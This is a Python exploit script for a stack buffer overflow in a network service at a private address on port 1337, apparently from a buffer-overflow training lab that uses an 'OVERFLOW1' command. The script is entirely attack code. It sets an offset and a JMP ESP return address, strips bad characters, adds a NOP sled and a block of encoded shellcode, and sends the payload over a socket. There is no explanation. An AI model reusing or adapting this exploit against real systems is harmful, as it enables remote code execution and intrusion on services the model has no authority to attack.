#!/usr/bin/env python3

import socket
import struct

def p32(data):
	return struct.pack("<I", data)

host, port = "10.10.49.145", 1337

all_chars = bytearray(range(1, 256))
bar_chars = [
	b"\x07",
	b"\x2d",
	b"\x2e",
	b"\xa0",
]

for bad_char in bar_chars:
	all_chars = all_chars.replace(bad_char, b"")

cmd = b"OVERFLOW1 "
length = 5000
offset = 1978
jmp_esp = p32(0x625011AF)

shellcode =  b""
shellcode += b"\xd9\xc9\xd9\x74\x24\xf4\xba\x27\xb4\xd7\x3d"
shellcode += b"\x5e\x29\xc9\xb1\x52\x31\x56\x17\x03\x56\x17"
shellcode += b"\x83\xc9\x48\x35\xc8\xe9\x59\x38\x33\x11\x9a"
shellcode += b"\x5d\xbd\xf4\xab\x5d\xd9\x7d\x9b\x6d\xa9\xd3"
shellcode += b"\x10\x05\xff\xc7\xa3\x6b\x28\xe8\x04\xc1\x0e"
shellcode += b"\xc7\x95\x7a\x72\x46\x16\x81\xa7\xa8\x27\x4a"
shellcode += b"\xba\xa9\x60\xb7\x37\xfb\x39\xb3\xea\xeb\x4e"
shellcode += b"\x89\x36\x80\x1d\x1f\x3f\x75\xd5\x1e\x6e\x28"
shellcode += b"\x6d\x79\xb0\xcb\xa2\xf1\xf9\xd3\xa7\x3c\xb3"
shellcode += b"\x68\x13\xca\x42\xb8\x6d\x33\xe8\x85\x41\xc6"
shellcode += b"\xf0\xc2\x66\x39\x87\x3a\x95\xc4\x90\xf9\xe7"
shellcode += b"\x12\x14\x19\x4f\xd0\x8e\xc5\x71\x35\x48\x8e"
shellcode += b"\x7e\xf2\x1e\xc8\x62\x05\xf2\x63\x9e\x8e\xf5"
shellcode += b"\xa3\x16\xd4\xd1\x67\x72\x8e\x78\x3e\xde\x61"
shellcode += b"\x84\x20\x81\xde\x20\x2b\x2c\x0a\x59\x76\x39"
shellcode += b"\xff\x50\x88\xb9\x97\xe3\xfb\x8b\x38\x58\x93"
shellcode += b"\xa7\xb1\x46\x64\xc7\xeb\x3f\xfa\x36\x14\x40"
shellcode += b"\xd3\xfc\x40\x10\x4b\xd4\xe8\xfb\x8b\xd9\x3c"
shellcode += b"\xab\xdb\x75\xef\x0c\x8b\x35\x5f\xe5\xc1\xb9"
shellcode += b"\x80\x15\xea\x13\xa9\xbc\x11\xf4\xdc\x52\x4d"
shellcode += b"\xd7\x89\x50\x6d\xf4\x61\xdc\x8b\x90\x61\x88"
shellcode += b"\x04\x0d\x1b\x91\xde\xac\xe4\x0f\x9b\xef\x6f"
shellcode += b"\xbc\x5c\xa1\x87\xc9\x4e\x56\x68\x84\x2c\xf1"
shellcode += b"\x77\x32\x58\x9d\xea\xd9\x98\xe8\x16\x76\xcf"
shellcode += b"\xbd\xe9\x8f\x85\x53\x53\x26\xbb\xa9\x05\x01"
shellcode += b"\x7f\x76\xf6\x8c\x7e\xfb\x42\xab\x90\xc5\x4b"
shellcode += b"\xf7\xc4\x99\x1d\xa1\xb2\x5f\xf4\x03\x6c\x36"
shellcode += b"\xab\xcd\xf8\xcf\x87\xcd\x7e\xd0\xcd\xbb\x9e"
shellcode += b"\x61\xb8\xfd\xa1\x4e\x2c\x0a\xda\xb2\xcc\xf5"
shellcode += b"\x31\x77\xec\x17\x93\x82\x85\x81\x76\x2f\xc8"
shellcode += b"\x31\xad\x6c\xf5\xb1\x47\x0d\x02\xa9\x22\x08"
shellcode += b"\x4e\x6d\xdf\x60\xdf\x18\xdf\xd7\xe0\x08"

nop_sled = b"\x90"*24

payload = b"".join(
	[
		cmd,
		b"A"*offset,
		jmp_esp,
		nop_sled,
		shellcode,
		b"C"*(length - len(jmp_esp) - offset - len(nop_sled) - len(shellcode))
	]
)

try:
	with socket.socket() as s:
		s.connect((host, port))
		s.send(payload)
		print("sent")
except: 
	print("Broken")

